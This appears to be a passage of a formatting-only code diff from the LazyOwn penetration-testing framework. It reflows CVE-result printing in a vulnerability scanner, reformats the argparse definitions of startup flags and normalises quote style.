     def persist(self, service: str, target: str, cves: list[dict]) -> str:
@@ -3207,11 +3310,9 @@ class VulnerabilityScanner:
 
         for cve in sorted(cves_details, key=_cvss_sort_key):
             cvss_value = cve.get("cvss") or VULN_CVSS_UNAVAILABLE
-            content = (
-                f"{cve.get('cve_id')};    {cve.get('description')};"
-                f"   {cvss_value}; {cve.get('url')} \n"
-            )
+            content = f"{cve.get('cve_id')};    {cve.get('description')};   {cvss_value}; {cve.get('url')} \n"
             print_msg(content)
+
 
 def _build_startup_parser() -> argparse.ArgumentParser:
     """Build the CLI argument parser for LazyOwn startup flags."""
@@ -3229,14 +3330,21 @@ def _build_startup_parser() -> argparse.ArgumentParser:
     parser.add_argument("-s", "--sudo", action="store_true", default=False)
     parser.add_argument("--old-banner", action="store_true", dest="old_banner", default=False)
     parser.add_argument("--no-logs", action="store_true", dest="no_logs", default=False)
-    parser.add_argument("--headless", action="store_true", default=False,
-                        help="Non-interactive mode with structured output (JSON).")
-    parser.add_argument("--json-output", action="store_true", default=False,
-                        help="Emit JSON results for every command.")
-    parser.add_argument("--profile", metavar="profile.yaml", default=None,
-                        help="YAML profile to override payload.json keys.")
-    parser.add_argument("--run-chain", metavar='"cmd1; cmd2; cmd3"', default=None,
-                        help="Semicolon-separated command chain (must be quoted).")
+    parser.add_argument(
+        "--headless", action="store_true", default=False, help="Non-interactive mode with structured output (JSON)."
+    )
+    parser.add_argument(
+        "--json-output", action="store_true", default=False, help="Emit JSON results for every command."
+    )
+    parser.add_argument(
+        "--profile", metavar="profile.yaml", default=None, help="YAML profile to override payload.json keys."
+    )
+    parser.add_argument(
+        "--run-chain",
+        metavar='"cmd1; cmd2; cmd3"',
+        default=None,
+        help="Semicolon-separated command chain (must be quoted).",
+    )
     return parser
 
 
@@ -3280,7 +3388,7 @@ if sys.version_info <= (3, 0):
     sys.stdout.write("Sorry, requires Python 3.x, not Python 2.x\n")
     sys.exit(1)
 
-if os.name == 'nt':
+if os.name == "nt":
     print("WINDOWS as Host OS Not currently supported - exiting")
     sys.exit()
 
